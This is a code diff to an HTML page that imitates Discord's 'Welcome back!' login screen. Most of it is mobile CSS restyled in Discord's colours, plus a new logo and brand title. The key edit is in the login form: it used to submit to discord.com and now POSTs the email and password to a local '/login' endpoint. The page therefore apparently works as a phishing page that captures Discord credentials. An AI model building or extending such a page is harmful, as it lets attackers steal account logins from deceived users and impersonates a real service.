@@ -152,12 +152,18 @@
       margin: 0 auto;
     }
 
-    /* MOBILE VIEW */
+    /* --- START: Mobile-specific changes --- */
     @media (max-width: 768px) {
+      body {
+        background: linear-gradient(to bottom, #2a2c31, #1e1f22);
+      }
+
       .container {
         flex-direction: column;
-        box-shadow: none;
         border-radius: 0;
+        box-shadow: none;
+        max-width: 100%;
+        padding: 0;
       }
 
       .right {
@@ -165,35 +171,98 @@
       }
 
       .left {
-        padding: 30px 20px;
-        align-items: stretch;
+        padding: 0;
+        align-items: center;
+        text-align: center;
       }
 
       .mobile-logo {
         display: block;
-        width: 150px;
-        margin: 10px auto 20px;
+        width: 60px;
+        margin: 30px auto 10px;
+      }
+
+      .brand-title {
+        font-size: 20px;
+        font-weight: 700;
+        color: #fff;
+        margin-bottom: 15px;
       }
 
       .left h2 {
-        text-align: center;
         font-size: 22px;
+        margin: 10px 0;
+        font-weight: bold;
+        color: #fff;
       }
 
       .subtext {
-        text-align: center;
-        font-size: 13px;
+        display: none;
+      }
+
+      form {
+        width: 100%;
+        max-width: 400px;
+        padding: 0 20px;
+      }
+
+      label {
+        font-size: 11px;
+        font-weight: 700;
+        color: #b9bbbe;
+        text-align: left;
+        width: 100%;
+        margin-bottom: 5px;
+        text-transform: uppercase;
+      }
+
+      label::after {
+        content: ' *';
+        color: #ed4245;
+      }
+
+      input {
+        width: 100%;
+        padding: 12px;
+        background-color: #1e1f22;
+        border: 1px solid #2b2d31;
+        border-radius: 5px;
+        color: white;
+        font-size: 14px;
         margin-bottom: 20px;
       }
 
-      label, input, button, a {
+      a {
+        font-size: 13px;
+        color: #00a8fc;
+        display: inline-block;
+        margin-bottom: 20px;
+        text-align: left;
         width: 100%;
       }
 
+      button {
+        width: 100%;
+        padding: 12px;
+        background-color: #5865f2;
+        color: white;
+        font-weight: bold;
+        font-size: 15px;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+      }
+
       .footer {
+        font-size: 13px;
+        color: #b9bbbe;
+        margin: 25px 0;
         text-align: center;
-        font-size: 12px;
-        margin-top: 25px;
+      }
+
+      .footer a {
+        color: #00a8fc;
+        text-decoration: none;
       }
     }
 
@@ -204,17 +273,20 @@
 </head>
 <body>
   <div class="container">
+
     <div class="left">
-      <img class="mobile-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e3/Discord_White_Text_Logo_%282015-2021%29.svg/2560px-Discord_White_Text_Logo_%282015-2021%29.svg.png" alt="Discord Logo" />
+      <!-- Mobile Logo -->
+      <img class="mobile-logo" src="https://cdn.worldvectorlogo.com/logos/discord-6.svg" alt="Discord Logo" />
+      <div class="brand-title">Discord</div>
 
       <h2>Welcome back!</h2>
       <p class="subtext">We're so excited to see you again!</p>
 
-      <form method="GET" action="https://discord.com">
-        <label for="email">EMAIL OR PHONE NUMBER *</label>
+      <form method="POST" action="/login">
+        <label for="email">EMAIL OR PHONE NUMBER</label>
         <input type="email" name="email" id="email" required>
 
-        <label for="password">PASSWORD *</label>
+        <label for="password">PASSWORD</label>
         <input type="password" name="password" id="password" required>
 
         <a href="https://discord.com/login/forgot">Forgot your password?</a>
@@ -234,4 +306,5 @@
     </div>
   </div>
 </body>
-</html>
+  </html>
+  
